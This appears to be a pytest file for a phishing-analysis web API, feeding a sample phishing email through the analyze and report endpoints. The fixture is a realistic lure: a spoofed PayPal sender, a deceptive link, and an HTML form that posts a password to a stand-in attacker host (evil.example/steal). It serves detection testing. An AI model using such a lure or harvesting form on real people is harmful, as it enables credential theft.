from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

PHISH = (
    'From: "PayPal Security" <no-reply@paypa1-verify.com>\r\n'
    "To: victim@example.com\r\n"
    "Subject: Your account is locked\r\n"
    "Authentication-Results: mx.example.com; spf=fail; dkim=none; dmarc=fail\r\n"
    "Reply-To: collect@totally-different.net\r\n"
    'Content-Type: text/html; charset="utf-8"\r\n'
    "\r\n"
    "<html><body><p>Verify now:</p>"
    '<a href="http://evil.example/login">https://paypal.com/verify</a>'
    '<form action="http://evil.example/steal"><input type="password" name="pw"></form>'
    "</body></html>\r\n"
)


def test_analyze_phish_returns_verdict():
    resp = client.post("/api/analyze", content=PHISH.encode(),
                       headers={"Content-Type": "message/rfc822"})
    assert resp.status_code == 200
    data = resp.json()

    assert data["score"]["verdict"] in {"Suspicious", "Malicious"}
    titles = [f["title"] for f in data["findings"]]
    assert "Display-name spoofing" in titles
    assert "Reply-To mismatch" in titles
    assert "Link text does not match target" in titles
    assert "http://evil.example/login" in data["iocs"]["urls"]


def test_analyze_empty_body_rejected():
    resp = client.post("/api/analyze", content=b"")
    assert resp.status_code == 400


def test_analyze_file_upload():
    resp = client.post("/api/analyze",
                       files={"file": ("phish.eml", PHISH.encode(), "message/rfc822")})
    assert resp.status_code == 200
    assert resp.json()["headers"]["subject"] == "Your account is locked"


def test_report_contains_markdown():
    resp = client.post("/api/report", content=PHISH.encode(),
                       headers={"Content-Type": "message/rfc822"})
    assert resp.status_code == 200
    md = resp.json()["markdown"]
    assert "# Phishing Triage Report" in md
    assert "Verdict" in md
